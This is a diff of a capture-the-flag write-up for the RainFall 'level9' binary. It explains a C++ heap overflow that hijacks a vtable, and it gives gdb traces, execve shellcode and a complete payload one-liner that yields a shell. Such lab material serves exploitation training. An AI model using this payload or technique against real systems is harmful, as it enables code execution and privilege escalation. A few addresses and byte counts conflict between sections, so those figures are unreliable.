@@ -1,400 +1,175 @@
-```
-(gdb) info functions
-All defined functions:
+---
 
-Non-debugging symbols:
-0x08048464  _init
-0x080484b0  __cxa_atexit
-0x080484b0  __cxa_atexit@plt
-0x080484c0  __gmon_start__
-0x080484c0  __gmon_start__@plt
-0x080484d0  std::ios_base::Init::Init()
-0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
-0x080484e0  __libc_start_main
-0x080484e0  __libc_start_main@plt
-0x080484f0  _exit
-0x080484f0  _exit@plt
-0x08048500  _ZNSt8ios_base4InitD1Ev
-0x08048500  _ZNSt8ios_base4InitD1Ev@plt
-0x08048510  memcpy
-0x08048510  memcpy@plt
-0x08048520  strlen
-0x08048520  strlen@plt
-0x08048530  operator new(unsigned int)
-0x08048530  _Znwj@plt
-0x08048540  _start
-0x08048570  __do_global_dtors_aux
-0x080485d0  frame_dummy
-0x080485f4  main
-0x0804869a  __static_initialization_and_destruction_0(int, int)
-0x080486da  _GLOBAL__sub_I_main
-0x080486f6  N::N(int)
-0x080486f6  N::N(int)
-0x0804870e  N::setAnnotation(char*)
-0x0804873a  N::operator+(N&)
-0x0804874e  N::operator-(N&)
-0x08048770  __libc_csu_init
-0x080487e0  __libc_csu_fini
-0x080487e2  __i686.get_pc_thunk.bx
-0x080487f0  __do_global_ctors_aux
-0x0804881c  _fini
-(gdb) disass main
-Dump of assembler code for function main:
-   0x080485f4 <+0>:	push   %ebp
-   0x080485f5 <+1>:	mov    %esp,%ebp
-   0x080485f7 <+3>:	push   %ebx
-   0x080485f8 <+4>:	and    $0xfffffff0,%esp
-   0x080485fb <+7>:	sub    $0x20,%esp
-   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
-   0x08048602 <+14>:	jg     0x8048610 <main+28>
-   0x08048604 <+16>:	movl   $0x1,(%esp)
-   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
-   0x08048610 <+28>:	movl   $0x6c,(%esp)
-   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
-   0x0804861c <+40>:	mov    %eax,%ebx
-   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
-   0x08048626 <+50>:	mov    %ebx,(%esp)
-   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
-   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
-   0x08048632 <+62>:	movl   $0x6c,(%esp)
-   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
-   0x0804863e <+74>:	mov    %eax,%ebx
-   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
-   0x08048648 <+84>:	mov    %ebx,(%esp)
-   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
-   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
-   0x08048654 <+96>:	mov    0x1c(%esp),%eax
-   0x08048658 <+100>:	mov    %eax,0x14(%esp)
-   0x0804865c <+104>:	mov    0x18(%esp),%eax
-   0x08048660 <+108>:	mov    %eax,0x10(%esp)
-   0x08048664 <+112>:	mov    0xc(%ebp),%eax
-   0x08048667 <+115>:	add    $0x4,%eax
-   0x0804866a <+118>:	mov    (%eax),%eax
-   0x0804866c <+120>:	mov    %eax,0x4(%esp)
-   0x08048670 <+124>:	mov    0x14(%esp),%eax
-   0x08048674 <+128>:	mov    %eax,(%esp)
-   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
-   0x0804867c <+136>:	mov    0x10(%esp),%eax
-   0x08048680 <+140>:	mov    (%eax),%eax
-   0x08048682 <+142>:	mov    (%eax),%edx
-   0x08048684 <+144>:	mov    0x14(%esp),%eax
-   0x08048688 <+148>:	mov    %eax,0x4(%esp)
-   0x0804868c <+152>:	mov    0x10(%esp),%eax
-   0x08048690 <+156>:	mov    %eax,(%esp)
-   0x08048693 <+159>:	call   *%edx
-   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
-   0x08048698 <+164>:	leave  
-   0x08048699 <+165>:	ret    
-End of assembler dump.
-(gdb) disass 0x8048530
-Dump of assembler code for function _Znwj@plt:
-   0x08048530 <+0>:	jmp    *0x8049b70
-   0x08048536 <+6>:	push   $0x40
-   0x0804853b <+11>:	jmp    0x80484a0
-End of assembler dump.
-(gdb) disass 0x80486f6
-Dump of assembler code for function _ZN1NC2Ei:
-   0x080486f6 <+0>:	push   %ebp
-   0x080486f7 <+1>:	mov    %esp,%ebp
-   0x080486f9 <+3>:	mov    0x8(%ebp),%eax
-   0x080486fc <+6>:	movl   $0x8048848,(%eax)
-   0x08048702 <+12>:	mov    0x8(%ebp),%eax
-   0x08048705 <+15>:	mov    0xc(%ebp),%edx
-   0x08048708 <+18>:	mov    %edx,0x68(%eax)
-   0x0804870b <+21>:	pop    %ebp
-   0x0804870c <+22>:	ret    
-End of assembler dump.
-(gdb) disass 0x804870e
-Dump of assembler code for function _ZN1N13setAnnotationEPc:
-   0x0804870e <+0>:	push   %ebp
-   0x0804870f <+1>:	mov    %esp,%ebp
-   0x08048711 <+3>:	sub    $0x18,%esp
-   0x08048714 <+6>:	mov    0xc(%ebp),%eax
-   0x08048717 <+9>:	mov    %eax,(%esp)
-   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
-   0x0804871f <+17>:	mov    0x8(%ebp),%edx
-   0x08048722 <+20>:	add    $0x4,%edx
-   0x08048725 <+23>:	mov    %eax,0x8(%esp)
-   0x08048729 <+27>:	mov    0xc(%ebp),%eax
-   0x0804872c <+30>:	mov    %eax,0x4(%esp)
-   0x08048730 <+34>:	mov    %edx,(%esp)
-   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-   0x08048738 <+42>:	leave  
-   0x08048739 <+43>:	ret    
-End of assembler dump.
-(gdb)
-```
+# Level9 — C++ Heap Overflow / Vtable Hijack + Shellcode
 
-memcpy : 
-```
- Cette fonction permet de copier un bloc de mémoire spécifié par le paramètre source, et dont la taille est spécifiée via le paramètre size, dans un nouvel emplacement désigné par le paramètre destination. Il est bien entendu qu'il est de votre responsabilité d'allouer suffisamment de mémoire pour le bloc de destination afin qu'il puisse contenir toutes les données.
+## Vulnerability
 
-En cas de chevauchement des deux blocs de mémoire (source et destination) le comportement de la fonction memcpy n'est pas garanti.
+The binary allocates two `N` objects on the heap. Each object has a **vtable pointer** at offset `+0` and data at offset `+4`. `setAnnotation()` copies `argv[1]` into the first object's data buffer using `memcpy()` with no bounds check. By overflowing into the second object, we **overwrite its vtable pointer**, then plant a fake vtable and shellcode inside the first object's data region.
+
+---
+
+## Heap Layout
+
+```
+0x804a008  [vtable ptr][... 104 bytes of data ...]   ← obj1 (108 bytes)
+0x804a078  [vtable ptr][... 104 bytes of data ...]   ← obj2 (108 bytes)
 ```
 
 ```
-0x08048680 <+140>:	mov    (%eax),%eax
-   0x08048682 <+142>:	mov    (%eax),%edx
-   0x08048684 <+144>:	mov    0x14(%esp),%eax
-   0x08048688 <+148>:	mov    %eax,0x4(%esp)
-   0x0804868c <+152>:	mov    0x10(%esp),%eax
-   0x08048690 <+156>:	mov    %eax,(%esp)
-   0x08048693 <+159>:	call   *%edx
+obj1+0x00 = 0x804a008  ← vtable ptr (set by constructor)
+obj1+0x04 = 0x804a00c  ← data starts here (memcpy writes here)
+obj1+0x10 = 0x804a018  ← shellcode starts here !
 ```
 
-call *%edx -> dereferencement; appelle l'adresse contenue dans edx
-au dessus il y a 2 dereferencement de eax
+---
 
-on sait aussi qu'il faut injecter un shellcode puisqu'il n'y a pas d'appel system dans le programme.
-avec le pattern generator : Offset de 108
-```
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+## Virtual Call Mechanism
 
-Breakpoint 1, 0x080485f8 in main ()
-(gdb) step
-Single stepping until exit from function main,
-which has no line number information.
-
-Program received signal SIGSEGV, Segmentation fault.
-0x08048682 in main ()
-(gdb) i r
-eax            0x41366441	1094083649
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x8048682	0x8048682 <main+142>
-eflags         0x210287	[ CF PF SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) 
+```asm
+mov (%eax),%eax      ; eax = obj2
+mov (%eax),%edx      ; edx = *obj2 = vtable ptr  ← we control this
+call *%edx           ; calls first vtable entry
 ```
 
+Two dereferences :
+
 ```
+obj2 → vtable → function
+
+step 1 : reads obj2[0]     = 0x804a00c  (our fake vtable address)
+step 2 : reads *(0x804a00c) = 0x804a010  (first entry = shellcode address)
+step 3 : jumps to 0x804a010             → shellcode !
+```
+
+---
+
+## Why 0x804a00c and 0x804a010
+
+```
+0x804a00c = obj1+4  ← start of our payload
+            first 4 bytes = fake vtable ptr = 0x804a010
+
+0x804a010 = obj1+4+4 = obj1+8  ← where shellcode begins
+            CPU reads 0x804a010 as function address
+            jumps there → executes shellcode !
+```
+
+---
+
+## Offset Calculation
+
+```
+obj1 data starts at : 0x804a00c  (memcpy destination = obj1+4)
+obj2 vtable ptr at  : 0x804a078
+
+distance = 0x804a078 - 0x804a00c = 0x6c = 108 bytes
+```
+
+Confirmed with cyclic pattern :
+
+```gdb
+(gdb) r Aa0Aa1...
+; eax = 0x41366441 at SIGSEGV → offset = 108
+```
+
+---
+
+## Payload Structure
+
+```
+[\x10\xa0\x04\x08]  [shellcode 24b]  [NOP * 80]  [\x0c\xa0\x04\x08]
+  4 bytes             24 bytes         80 bytes     4 bytes
+  ↑                   ↑                             ↑
+  fake vtable entry   shellcode at                  overwrites obj2
+  points to           0x804a010                     vtable ptr
+  shellcode
+  ←————————————————— 108 bytes ————————————————————→
+```
+
+### Byte by byte
+
+```
+bytes 0-3   : \x10\xa0\x04\x08  → fake vtable first entry = 0x804a010
+              stored at 0x804a00c = our fake vtable location
+bytes 4-27  : shellcode          → execve("/bin//sh")
+              stored at 0x804a010 ← CPU jumps here !
+bytes 28-107: \x90 * 80          → NOP sled
+bytes 108-111: \x0c\xa0\x04\x08 → overwrites obj2 vtable ptr
+               obj2[0] = 0x804a00c = our fake vtable
+```
+
+---
+
+## Shellcode
+
+```asm
+\x31\xc0        xor eax, eax
+\x99            cdq              ; edx = 0
+\x50            push eax         ; null terminator
+\x68\x2f\x2f\x73\x68  push "//sh"
+\x68\x2f\x62\x69\x6e  push "/bin"
+\x89\xe3        mov ebx, esp     ; ebx = "/bin//sh"
+\x50            push eax
+\x53            push ebx
+\x89\xe1        mov ecx, esp     ; ecx = argv
+\xb0\x0b        mov al, 11       ; execve syscall
+\xcd\x80        int 0x80
+```
+
+---
+
+## GDB Steps
+
+```bash
+# find obj1+4 address after memcpy
 (gdb) b memcpy
-Breakpoint 2 at 0x8048510
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-
-Breakpoint 1, 0x080485f8 in main ()
-(gdb) step
-Single stepping until exit from function main,
-which has no line number information.
-
-Breakpoint 2, 0xb7e80170 in ?? () from /lib/i386-linux-gnu/libc.so.6
-(gdb) i r
-eax            0xbffff84c	-1073743796
-ecx            0xc	12
-edx            0x804a00c	134520844
-ebx            0x804a078	134520952
-esp            0xbffff62c	0xbffff62c
-ebp            0xbffff648	0xbffff648
-esi            0x0	0
-edi            0x0	0
-eip            0xb7e80170	0xb7e80170
-eflags         0x200292	[ AF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
+(gdb) r <payload>
 (gdb) finish
-Run till exit from #0  0xb7e80170 in ?? () from /lib/i386-linux-gnu/libc.so.6
-0x08048738 in N::setAnnotation(char*) ()
-(gdb) i r
-eax            0x804a00c	134520844
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff630	0xbffff630
-ebp            0xbffff648	0xbffff648
-esi            0x0	0
-edi            0x0	0
-eip            0x8048738	0x8048738 <N::setAnnotation(char*)+42>
-eflags         0x200287	[ CF PF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/x $eax
-0x804a00c:	0x41306141
+(gdb) i r $eax
+# eax = 0x804a00c  ← start of our data
+# shellcode at eax+4 = 0x804a010 ← fake vtable entry points here
 ```
 
-adresse bloc memoire qpres memcpy : 0x804a00c
+---
 
-```
-Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+## Final Payload
 
-Breakpoint 1, 0x080485f8 in main ()
-(gdb) step
-Single stepping until exit from function main,
-which has no line number information.
+```bash
+python -c "print(
+  '\x10\xa0\x04\x08' +
+  '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
+  '\x90' * 80 +
+  '\x0c\xa0\x04\x08'
+)" > /tmp/exploit
 
-Breakpoint 2, 0x08048530 in operator new ()
-(gdb) finish
-Run till exit from #0  0x08048530 in operator new ()
-0x0804861c in main ()
-(gdb) i r
-eax            0x804a008	134520840
-ecx            0x0	0
-edx            0xb7eec440	-1209088960
-ebx            0xb7eebff4	-1209090060
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x804861c	0x804861c <main+40>
-eflags         0x200282	[ SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-Breakpoint 2, 0x08048530 in operator new ()
-(gdb) finish
-Run till exit from #0  0x08048530 in operator new ()
-0x0804863e in main ()
-(gdb) i r
-eax            0x804a078	134520952
-ecx            0x20f21	134945
-edx            0xb7eec440	-1209088960
-ebx            0x804a008	134520840
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x804863e	0x804863e <main+74>
-eflags         0x200282	[ SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) finish
-Run till exit from #0  0xb7e80170 in ?? () from /lib/i386-linux-gnu/libc.so.6
-0x08048738 in N::setAnnotation(char*) ()
-(gdb) i r
-eax            0x804a00c	134520844
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff630	0xbffff630
-ebp            0xbffff648	0xbffff648
-esi            0x0	0
-edi            0x0	0
-eip            0x8048738	0x8048738 <N::setAnnotation(char*)+42>
-eflags         0x200287	[ CF PF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/200wx $eax
-0x804a00c:	0x41306141	0x61413161	0x33614132	0x41346141
-0x804a01c:	0x61413561	0x37614136	0x41386141	0x62413961
-0x804a02c:	0x31624130	0x41326241	0x62413362	0x35624134
-0x804a03c:	0x41366241	0x62413762	0x39624138	0x41306341
-0x804a04c:	0x63413163	0x33634132	0x41346341	0x63413563
-0x804a05c:	0x37634136	0x41386341	0x64413963	0x31644130
-0x804a06c:	0x41326441	0x64413364	0x35644134	0x41366441
-0x804a07c:	0x64413764	0x39644138	0x41306541	0x65413165
-0x804a08c:	0x33654132	0x41346541	0x65413565	0x37654136
-0x804a09c:	0x41386541	0x66413965	0x31664130	0x41326641
-0x804a0ac:	0x66413366	0x35664134	0x41366641	0x66413766
-0x804a0bc:	0x39664138	0x41306741	0x67413167	0x33674132
-0x804a0cc:	0x41346741	0x67413567	0x00000000	0x00000000
-...
-(gdb) step
-Single stepping until exit from function _ZN1N13setAnnotationEPc,
-which has no line number information.
-
-Breakpoint 8, 0x0804867c in main ()
-(gdb) i r
-eax            0x804a00c	134520844
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x804867c	0x804867c <main+136>
-eflags         0x200287	[ CF PF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) step
-Single stepping until exit from function main,
-which has no line number information.
-
-Breakpoint 6, 0x08048680 in main ()
-(gdb) i r
-eax            0x804a078	134520952
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x8048680	0x8048680 <main+140>
-eflags         0x200287	[ CF PF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/10wx $eax
-0x804a078:	0x41366441	0x64413764	0x39644138	0x41306541
-0x804a088:	0x65413165	0x33654132	0x41346541	0x65413565
-0x804a098:	0x37654136	0x41386541
-(gdb) step
-Single stepping until exit from function main,
-which has no line number information.
-
-Breakpoint 7, 0x08048682 in main ()
-(gdb) i r
-eax            0x41366441	1094083649
-ecx            0x67413567	1732326759
-edx            0x804a0d4	134521044
-ebx            0x804a078	134520952
-esp            0xbffff650	0xbffff650
-ebp            0xbffff678	0xbffff678
-esi            0x0	0
-edi            0x0	0
-eip            0x8048682	0x8048682 <main+142>
-eflags         0x200287	[ CF PF SF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) 
+./level9 $(cat /tmp/exploit)
 ```
 
+---
+
+## Full Execution Flow
+
 ```
-level9@RainFall:~$ python -c "print ('\x0c\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90' * 80 + '\x0c\xa0\x04\x08')" > /tmp/exploit
-level9@RainFall:~$ ./level9 $(cat /tmp/exploit)
+1. new N(5)  →  obj1 at 0x804a008
+2. new N(6)  →  obj2 at 0x804a078
+3. setAnnotation(argv[1])
+   → memcpy(0x804a00c, payload, 112)
+   → 0x804a00c : \x10\xa0\x04\x08  (fake vtable entry → shellcode)
+   → 0x804a010 : shellcode
+   → 0x804a078 : \x0c\xa0\x04\x08  (obj2 vtable overwritten)
+4. call *%edx
+   → edx = *obj2        = 0x804a00c  (fake vtable)
+   → edx = *(0x804a00c) = 0x804a010  (shellcode address)
+   → jumps to 0x804a010
+5. shellcode → execve("/bin//sh") → shell !
+```
+
+---
+
+## Result
+
+```bash
+./level9 $(cat /tmp/exploit)
 $ whoami
-bonus0
-$ 
+bonus0    ← shell obtained !
 ```
